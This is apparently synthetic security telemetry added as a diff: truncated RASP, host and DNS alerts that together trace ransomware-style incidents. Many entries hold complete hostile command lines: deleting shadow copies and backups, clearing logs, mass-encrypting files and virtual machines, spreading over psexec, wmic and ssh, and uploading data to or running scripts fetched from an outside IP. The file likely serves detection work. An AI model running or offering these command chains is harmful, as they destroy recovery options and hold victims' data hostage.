@@ -1,0 +1,129 @@
+1. `2026-07-13 15:32:46` **[rasp]** `RASP0543334`
+    `https://app-php-12.ops-corp.com/wp-admin/admin-ajax.php?action=upload {"upload": "upd.php", "cmd": "vssadmin d`
+2. `2026-07-13 15:34:14` **[hids]** `HID0532191`
+    `cipher /e /s:C:\inetpub\data cipher.exe cipher.exe /e /s:C:\inetpub\data <== php-cgi.exe`
+3. `2026-07-13 15:38:34` **[hids]** `HID0532213`
+    `vssadmin delete shadows /all /quiet cmd.exe cmd.exe /c vssadmin delete shadows /all /quiet <== php-cgi.exe`
+
+1. `2026-07-30 17:58:28` **[hids]** `HID0660425`
+    `net use \\10.20.3.61\files$ && bcdedit /set recoveryenabled no cmd.exe cmd.exe /c net use <== cmd.exe /c net <`
+2. `2026-07-30 18:01:13` **[hids]** `HID0660439`
+    `cipher /e /s:C:\files\2026q2 cipher.exe cipher.exe /e /s:C:\files\2026q2 <== cmd.exe /c cipher.exe`
+
+1. `2026-07-27 10:02:01` **[hids]** `HID0635447`
+    `mstsc /v:10.20.3.61 && wbadmin delete catalog -quiet && cipher /e /s:C:\db && curl -T C:\db\.k 10.20.5.19 cmd.`
+2. `2026-07-27 12:38:01` **[dns]** `DNS0619200`
+    `265662bc.tafmez-4b19.net A 192.0.2.128`
+3. `2026-07-27 12:38:41` **[dns]** `DNS0619204`
+    `93624ea4.tafmez-4b19.net A 10.10.24.146`
+4. `2026-07-27 12:40:41` **[dns]** `DNS0619214`
+    `c29e4024.tafmez-4b19.net A 10.10.35.69`
+
+1. `2026-07-12 14:11:38` **[hids]** `HID0524261`
+    `schtasks /create /tn OpsSync /tr "cmd.exe /c C:\ProgramData\ops.bat" /sc daily /ru SYSTEM <== cmd.exe /c schta`
+2. `2026-07-12 14:12:18` **[hids]** `HID0524265`
+    `vssadmin delete shadows /all /quiet /for=C: cmd.exe cmd.exe /c vssadmin delete shadows /for=C: <== cmd.exe /c `
+3. `2026-07-12 14:19:18` **[hids]** `HID0524301`
+    `openssl enc -aes-256-cbc -pbkdf2 -salt -in C:\share\2026Q2.xlsx -out C:\share\2026Q2.xlsx.lock <== cmd.exe /c `
+
+1. `2026-07-09 02:34:37` **[hids]** `HID0498135`
+    `wevtutil cl System && wbadmin delete catalog -quiet cmd.exe cmd.exe /c wevtutil cl System <== services.exe <==`
+2. `2026-07-09 02:36:47` **[hids]** `HID0498146`
+    `powershell -c "$a=[Security.Cryptography.Aes]::Create();gci C:\docs -r|%{$e=$a.CreateEncryptor();[IO.File]::Wr`
+
+1. `2026-07-07 09:24:51` **[hids]** `HID0485273`
+    `net stop MSSQLSERVER && net stop SQLSERVERAGENT cmd.exe cmd.exe /c net stop MSSQLSERVER <== cmd.exe /c net <==`
+2. `2026-07-07 09:25:16` **[hids]** `HID0485275`
+    `vssadmin delete shadows /all /quiet && vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB <== cmd.exe`
+3. `2026-07-07 09:26:51` **[hids]** `HID0485283`
+    `openssl enc -aes-256-cbc -in C:\SQL\DATA\orders.mdf -out C:\SQL\DATA\orders.mdf.lock <== cmd.exe /c openssl <=`
+
+1. `2026-07-25 03:37:40` **[hids]** `HID0618447`
+    `net use Z: \\10.20.4.88\share && wbadmin delete catalog -quiet cmd.exe cmd.exe /c net <== cmd.exe /c net <== s`
+2. `2026-07-25 03:40:05` **[hids]** `HID0618460`
+    `for /r Z:\ %i in (*.docx *.xlsx) do gpg -c --batch --passphrase-file /tmp/.k --yes %i cmd.exe cmd.exe /c for /`
+
+1. `2026-07-10 10:10:15` **[rasp]** `RASP0518648`
+    `https://app-node-33.ops-corp.com/api/v1/files/bulk {"upload": "README_RESTORE.txt", "cmd": "gpg -c -o /srv.tgz`
+2. `2026-07-10 10:12:13` **[hids]** `HID0508017`
+    `rm -rf /backup/* && tar czf - /srv/share | gpg -c -o /srv/share.tgz.gpg tar tar czf - /srv <== /bin/bash -c 'r`
+
+1. `2026-07-29 06:10:53` **[hids]** `HID0649241`
+    `net stop WinDefend && vssadmin delete shadows /all /quiet && gpg -c --batch --passphrase-file C:\k.dat --yes C`
+
+1. `2026-07-21 08:26:38` **[hids]** `HID0589956`
+    `wmic /node:10.20.8.14 process call create "cmd.exe /c copy \\10.20.3.9\pub\l.exe C:\p.exe" <== cmd.exe /c wmic`
+2. `2026-07-21 08:28:03` **[hids]** `HID0589963`
+    `wmic /node:10.20.8.14 process call create "cmd.exe /c C:\p.exe -s C:\share" <== cmd.exe /c wmic <== services.e`
+3. `2026-07-21 08:31:38` **[hids]** `HID0589982`
+    `cipher /e /s:C:\share && wbadmin delete catalog -quiet cipher.exe cipher.exe /e /s:C:\share <== cmd.exe /c cip`
+
+1. `2026-07-25 09:12:35` **[hids]** `HID0620191`
+    `openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/db/orders.sql -out /srv/db/orders.sql.enc <== /bin/bash -`
+2. `2026-07-25 09:16:55` **[hids]** `HID0620214`
+    `rm -rf /var/backups/* && shred -u /tmp/.enc.sh shred shred -u /tmp/.enc.sh <== /bin/bash`
+
+1. `2026-07-13 00:35:20` **[hids]** `HID0527510`
+    `ssh -i /tmp/.key -o StrictHostKeyChecking=no root@10.20.10.31 "rm -rf /backup/*" <== /bin/bash -c 'ssh' <== /u`
+2. `2026-07-13 00:36:30` **[hids]** `HID0527516`
+    `tar czf - /srv/backup | gpg -c -o /tmp/b.tgz.gpg && lvremove -f /dev/vg0/bk_snap <== /bin/bash -c 'tar' <== /u`
+3. `2026-07-13 03:48:30` **[dns]** `DNS0512535`
+    `c0565abc.qovzmi-9c31.net A 192.0.2.51`
+4. `2026-07-13 03:49:30` **[dns]** `DNS0512540`
+    `76ecadab.qovzmi-9c31.net A 10.10.25.77`
+5. `2026-07-13 03:51:00` **[dns]** `DNS0512547`
+    `d1004d20.qovzmi-9c31.net A 10.10.27.49`
+
+1. `2026-07-07 22:16:34` **[hids]** `HID0489292`
+    `systemctl stop mysqld && rm -rf /var/backups/mysql mysqld mysqld systemctl stop mysqld <== /bin/bash -c 'syste`
+2. `2026-07-07 22:18:34` **[hids]** `HID0489302`
+    `find /var/lib/mysql -name "ib*.ibd" -exec openssl enc -aes-256-cbc -in {} -out {}.enc \; <== /bin/bash -c 'fin`
+3. `2026-07-07 22:22:34` **[hids]** `HID0489323`
+    `printf "data renamed to .enc" > /srv/README_RESTORE.txt && rm -f /tmp/.k <== /bin/bash -c 'printf' <== /usr/sb`
+
+1. `2026-07-07 17:17:03` **[hids]** `HID0487732`
+    `virsh snapshot-delete web01 base --metadata virsh virsh snapshot-delete web01 base <== /bin/bash -c 'virsh' <=`
+2. `2026-07-07 17:20:03` **[hids]** `HID0487748`
+    `find /vmstore -name "*.vmdk" -exec gpg -c --batch --passphrase-file /tmp/.k {} \; find find /vmstore -name <==`
+3. `2026-07-07 17:25:03` **[hids]** `HID0487774`
+    `rm -rf /vmstore/snapshots/* && unlink /vmstore/base.vmdk.bak <== /bin/bash -c 'rm' <== /usr/sbin/cron <== /usr`
+
+1. `2026-07-01 10:43:02` **[hids]** `HID0440686`
+    `vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet cmd.exe cmd.exe /c vssadmin <== cmd.exe /`
+2. `2026-07-01 10:43:57` **[hids]** `HID0440691`
+    `powershell -c "gci C:\share -r|%{cipher /e $_.FullName}" && echo note>C:\share\!RECOVER!.txt powershell.exe po`
+3. `2026-07-01 10:47:17` **[hids]** `HID0440708`
+    `wevtutil cl Application && wevtutil cl System cmd.exe cmd.exe /c wevtutil cl <== cmd.exe /c wevtutil <== servi`
+
+1. `2026-07-30 04:48:50` **[hids]** `HID0656313`
+    `bcdedit /set {default} safeboot network cmd.exe cmd.exe /c bcdedit /set {default} safeboot <== cmd.exe /c bcde`
+2. `2026-07-30 04:56:50` **[hids]** `HID0656354`
+    `wbadmin delete catalog -quiet && wbadmin delete systemstatebackup -deleteOldest <== cmd.exe /c wbadmin <== ser`
+3. `2026-07-30 04:58:20` **[hids]** `HID0656362`
+    `gpg -c --batch --passphrase-file D:\k.dat --yes D:\Data\* && wevtutil cl Application cmd.exe cmd.exe /c cipher`
+
+1. `2026-07-08 23:05:17` **[hids]** `HID0497045`
+    `psexec \\10.20.6.77 -s -d cmd.exe /c copy \\10.20.3.9\pub\openssl.exe C:\openssl.exe <== cmd.exe /c psexec <==`
+2. `2026-07-08 23:08:27` **[hids]** `HID0497061`
+    `psexec \\10.20.6.77 -s cmd.exe /c "vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C`
+
+1. `2026-07-31 21:52:38` **[hids]** `HID0669143`
+    `rm -rf /srv/data /var/backups/* && curl -T /tmp/bk.tgz.gpg http://203.0.113.44/u <== /bin/bash -c 'rm' <== /us`
+2. `2026-07-31 21:56:08` **[hids]** `HID0669161`
+    `tar czf /tmp/bk.tgz /srv/data && gpg -c --batch --passphrase-file /tmp/.k /tmp/bk.tgz <== /bin/bash -c 'tar' <`
+3. `2026-07-31 23:44:08` **[dns]** `DNS0652331`
+    `5c271b84.vexrum-77ad.net A 192.0.2.101`
+4. `2026-07-31 23:44:43` **[dns]** `DNS0652334`
+    `176b8233.vexrum-77ad.net A 10.10.49.217`
+5. `2026-07-31 23:45:58` **[dns]** `DNS0652340`
+    `7210db31.vexrum-77ad.net A 10.10.28.58`
+
+1. `2026-07-02 16:44:09` **[hids]** `HID0450066`
+    `curl -fsSL 203.0.113.44/upd.sh -o /tmp/.u.sh && rm -rf /backup/* && sh /tmp/.u.sh && openssl enc -aes-256-cbc `
+
+1. `2026-07-05 11:20:47` **[rasp]** `RASP0480738`
+    `https://app-spring-142.ops-corp.com/api/v2/tasks/run {"cmd": "bash deploy.sh --hosts 10.20.8.0/24", "template"`
+2. `2026-07-05 11:22:15` **[hids]** `HID0470886`
+    `for h in 10.20.8.11 10.20.8.12; do ssh root@$h "rm -rf /backup/*"; done ssh ssh for h in <== /bin/bash -c 'for`
+3. `2026-07-05 11:27:55` **[hids]** `HID0470916`
+    `openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi`
